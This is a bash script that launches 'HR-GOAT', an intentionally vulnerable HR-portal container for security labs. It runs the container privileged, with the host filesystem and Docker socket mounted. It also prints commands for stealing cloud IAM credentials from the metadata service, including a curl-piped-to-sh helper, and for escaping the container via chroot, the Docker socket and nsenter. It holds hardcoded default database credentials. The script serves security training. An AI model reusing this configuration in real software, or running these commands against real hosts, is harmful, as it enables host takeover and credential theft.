#!/bin/bash

# Script to run HR-GOAT container with metadata service access enabled
# FOR SECURITY TESTING/LAB USE ONLY - This configuration is intentionally vulnerable

echo "==== HR-GOAT Vulnerable Container Launcher ===="
echo "[!] WARNING: This runs the container with metadata service access enabled"
echo "[!] This is intentionally vulnerable for security testing purposes"
echo ""

# Get the latest image from ECR or use a local one
IMAGE="${1:-hrgoat-app:latest}"

# Database configuration (update these based on your RDS instance)
DB_HOST="${DB_HOST:-hrgoat-db.cnye4gmgu5x2.us-east-1.rds.amazonaws.com}"
DB_USER="${DB_USER:-admin}"
DB_PASSWORD="${DB_PASSWORD:-hrportaladmin123}"
DB_NAME="${DB_NAME:-hrportal}"

echo "Using image: $IMAGE"
echo "Database host: $DB_HOST"
echo ""

# Stop and remove existing container
echo "[*] Stopping existing container..."
docker stop hrportal 2>/dev/null || true
docker rm hrportal 2>/dev/null || true

# Run container with metadata access enabled AND container escape vulnerabilities
echo "[*] Starting vulnerable container with escape vectors..."
docker run -d \
  --name hrportal \
  -p 80:8080 \
  -e DB_HOST="$DB_HOST" \
  -e DB_USER="$DB_USER" \
  -e DB_PASSWORD="$DB_PASSWORD" \
  -e DB_NAME="$DB_NAME" \
  -e PORT="8080" \
  -e VITE_BASE_URL="http://localhost" \
  --privileged \
  --pid=host \
  --cap-add=ALL \
  --security-opt apparmor:unconfined \
  --security-opt seccomp:unconfined \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /:/host \
  -v /proc:/hostproc:ro \
  $IMAGE

echo ""
echo "[+] Container started successfully!"
echo "[+] Application available at: http://localhost:80"
echo ""
echo "==== Metadata Service Access Test ===="
echo "You can now exec into the container and access metadata service:"
echo ""
echo "  docker exec -it hrportal /bin/sh"
echo "  curl http://169.254.169.254/"
echo ""
echo "Or use the helper script:"
echo "  docker exec -it hrportal /bin/sh -c 'curl -sL https://raw.githubusercontent.com/YOUR_REPO/main/scripts/get-iam-creds.sh | sh'"
echo ""

# Quick test to verify metadata access
echo "[*] Quick metadata access test..."
docker exec hrportal sh -c 'curl -s --connect-timeout 2 http://169.254.169.254/ >/dev/null 2>&1 && echo "[+] Metadata service is accessible from container!" || echo "[-] Metadata service is NOT accessible"'

echo ""
echo "==== Container Escape Vulnerability Test ===="
echo "[*] Checking container escape vectors..."
echo ""

# Check privileged mode
docker exec hrportal sh -c 'grep CapEff /proc/self/status | grep -q "ffffffff" && echo "[+] Container is running in PRIVILEGED mode - escape possible!" || echo "[-] Container is NOT privileged"'

# Check Docker socket
docker exec hrportal sh -c '[ -S /var/run/docker.sock ] && echo "[+] Docker socket is mounted - escape possible via Docker!" || echo "[-] Docker socket not found"'

# Check host filesystem
docker exec hrportal sh -c '[ -d /host ] && echo "[+] Host filesystem is mounted at /host - direct escape possible!" || echo "[-] Host filesystem not mounted"'

# Check PID namespace
docker exec hrportal sh -c 'ps aux | grep -q systemd && echo "[+] Host PID namespace accessible - process escape possible!" || echo "[-] Isolated PID namespace"'

echo ""
echo "==== Container Escape Commands ===="
echo "Try these commands inside the container:"
echo ""
echo "1. Direct host access:"
echo "   docker exec -it hrportal sh -c 'chroot /host /bin/bash'"
echo ""
echo "2. Docker socket escape:"
echo "   docker exec -it hrportal sh -c 'docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh'"
echo ""
echo "3. Process namespace escape:"
echo "   docker exec -it hrportal sh -c 'nsenter -t 1 -m -u -i -n -p bash'" 